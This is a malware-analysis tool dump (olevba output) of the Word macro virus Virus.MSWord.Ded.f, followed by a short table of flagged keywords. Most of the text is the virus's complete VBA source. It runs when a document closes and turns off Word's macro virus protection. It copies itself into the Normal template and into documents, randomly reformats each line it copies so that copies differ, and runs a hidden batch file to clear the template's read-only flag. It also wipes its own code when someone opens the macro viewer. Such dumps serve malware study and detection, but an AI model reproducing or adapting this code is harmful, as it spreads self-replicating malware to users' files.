olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.f-1030b5a57f33b91a50bb14694911997b0888431d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.f-1030b5a57f33b91a50bb14694911997b0888431d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private _
Sub Document_New()

              End Sub
'41,99805
    Private Sub _
Document_Close()

        On Error GoTo _
skam

       Options. _
                               VirusProtection = False

         SWL
'82,54276
ABS99
'67,04335
skam:
'44,55818
      End Sub
'85,86148
         Private _
Sub SWL()

  Application. _
                                           ShowVisualBasicEditor = False

   If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        For I = 1 To NormalTemplate.VBProject.VBComponents(1). _
                                 CodeModule.CountOfLines

       d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

     If Len(d) > 0 And Not d _
= " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 While _
Mid(d, Len(d) - 1, 2) = " _"

    I = I + 1
'14,90067
           d = Left(d, Len(d) - 1) _
& NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

              Wend
'66,12489
     d _
= e(d)

ActiveDocument. _
                                             VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

     End If
'61,32453
           Next I
'94,38792
             ActiveDocument. _
                                                      SaveAs AddToRecentFiles:=False

End _
If

           End Sub
'20,21785
            Private Sub _
ABS99()

          If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

              f (NormalTemplate. _
                                FullName)

          For I _
= 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

         While Mid(d, Len(d) _
- 1, 2) = " _"

    I = I _
+ 1

 d _
= Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        Wend
'87,81058
     d = e(d)
'62,09572
            NormalTemplate.VBProject. _
VBComponents(1).CodeModule.InsertLines I * 2, d

    End _
If

  Next _
I

      NormalTemplate. _
Save

     End If
'58,89713
              End Sub
'36,93062
             Private _
Function e(aString) As String

     aString _
= LTrim(aString)

         aString = RTrim(aString)
'17,72022
       If _
aString = "Sub " & "Vc()" Then

        aString = "Sub " & "ViewVBCode()"
'5,340987
    Else
'64,714
   If _
aString = "Sub " & "ViewVBCode()" Then

aString = "Sub " & "Vc()"
'16,62625
          End _
If

           End If
'19,02367
 For I _
= 1 To Len(aString) - 1

  If _
Mid(aString, I, 1) = "." Then

             If Not Mid(aString, I _
- 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

           If Not _
Mid(aString, I + 1, 1) = Chr$(34) Then

              e = Left(aString, _
I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

             For j = _
1 To Int(15 * Rnd)

           e = " " & e
'72,8431
    Next _
j

         Exit Function
'38,68413
          End If
'3,458124
           End _
If

        Else
'8,961457
         If _
Mid(aString, I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

     If Not Mid(aString, _
I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

            e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

           For _
j = 1 To Int(15 * Rnd)

  e = " " & _
e

     Next j
'43,27629
Exit Function
'54,30309
   End If
'7,630748
            End _
If

            End If
'77,58292
  Next I
'85,94811
e = _
aString & Chr$(13) & "'" & (100 * Rnd)

          Count = Int(15 * Rnd)
'91,29763
For _
j = 1 To Count

        e = " " & _
e

Next _
j

           End Function
'46,26986
     Private _
Sub f(fName)

            If GetAttr(fName) And vbReadOnly _
Then

     Open Dir(fName) _
& ".bat" For Append As #1

         Print #1, "Attrib " & "-r " & Chr$(34) _
& fName & Chr$(34)

              Print #1, "del " & Chr$(34) _
& Dir(fName) & ".bat" & Chr$(34)

 Close _
#1

           shellResult = Shell(Dir(fName) & ".bat", vbHide)
'46,91217
             End If
'14,64869
        End Sub
'6,914055
       Sub ViewVBCode()
'46,64
    For aDoc _
= 1 To Documents.Count

   For I = 1 _
To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

   Documents(aDoc).VBProject. _
                                VBComponents(1).CodeModule.DeleteLines 1

              Next I
'4,419452
  Next _
aDoc

  For I = _
1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

          NormalTemplate. _
                                                       VBProject.VBComponents(1).CodeModule.DeleteLines 1

          Next I
'18,51813
       Application.ShowVisualBasicEditor _
= True

 End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

